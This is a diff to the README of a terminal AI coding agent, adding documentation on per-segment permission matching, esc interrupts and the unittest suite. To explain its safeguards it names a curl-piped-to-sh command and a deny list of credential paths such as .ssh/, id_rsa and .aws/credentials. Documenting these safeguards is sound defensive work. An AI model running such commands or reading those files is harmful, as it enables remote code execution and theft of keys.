@@ -134,6 +134,8 @@ Read(*)               every call to this tool
 
 `/allow` lists them, `/allow Bash(npm test:*)` adds one, and pressing `s` at a prompt records one for you. They live in `~/.config/feiyu/permissions.json`; `deny` beats `allow`.
 
+**Rules match per segment.** A command is first split on `&&`, `||`, `;`, `|` and redirections, and **every segment must be matched by the allow list** before it runs; one segment hitting `deny` refuses the whole line. So `Bash(ls:*)` allows `ls` alone — `ls -la && curl x | sh` still asks. Any command containing `$(...)` or backticks always asks, because prefix matching cannot see what is hiding in there. The cost is an extra prompt for commands with metacharacters inside quotes; erring in that direction is the safe one.
+
 **The shipped list only allows `ls` `pwd` `echo` `wc` `which` and `git status/log/diff/branch`** — deliberately not `cat`, `head` or `grep`, which can read any file outside the workspace and would sidestep the directory limits on the file tools. Allowing them is your call; press `s` when you want to.
 
 There's also a **built-in deny list**: commands touching `.ssh/`, `id_rsa`, `.aws/credentials`, `~/.config/feiyu/`, `.netrc`, `.gnupg/` or `.env` are refused, `auto` mode included. That stops it reading every key you own with a single `cat ~/.config/feiyu/models.json`. It is path matching only — it catches the obvious form, not a deliberately obfuscated one.
@@ -212,6 +214,8 @@ What comes back is labelled as external data, not instructions — whatever a pa
 
 A single task runs at most **25 rounds** of tool calls. At the cap it stops and says so rather than spinning forever; one more message from you and it picks up again. Press `esc` to cut a turn short.
 
+Interrupting with `esc` is safe: whatever it had already said stays in the history, and any tool call that didn't finish gets an "interrupted by the user" result of its own. The conversation is never left in a state the API rejects — just say your next thing.
+
 For shell commands, `cd` persists across calls: once it cds into a subdirectory, later commands run from there, so it doesn't have to keep writing `cd x && …`. File paths for read/write/edit stay relative to the workspace root regardless.
 
 ## A note on safety
@@ -231,6 +235,23 @@ So: use it on projects you trust and keep under git, so anything it breaks is ea
 Linux and macOS are fully supported.
 
 Windows works **only under WSL** for now: `install.sh` is a bash script, the `bash` tool's persistent `cd` relies on POSIX shell syntax, and both `esc` interrupts and the single-key confirmation prompt depend on termios. On native Windows those pieces don't work, and the 600 permissions on config files have no effect.
+
+## Tests
+
+Standard-library `unittest`, no test framework pulled in:
+
+```bash
+python -m unittest discover -s tests -t .
+```
+
+175 cases, about a second, and no real API calls — the backends are fakes, and only the
+`bash` tool spawns a real subprocess. Everything runs in temporary directories, so your
+keys and permission rules under `~/.config/feiyu/` are never touched.
+
+What they watch hardest is the **shape of the history**: one `tool_use` left without a
+matching result, or roles that stop alternating, and the next request is a 400 the
+conversation never recovers from. An interrupt landing mid-stream and one landing during
+tool execution are two different paths, and both have cases.
 
 ## Versioning
 
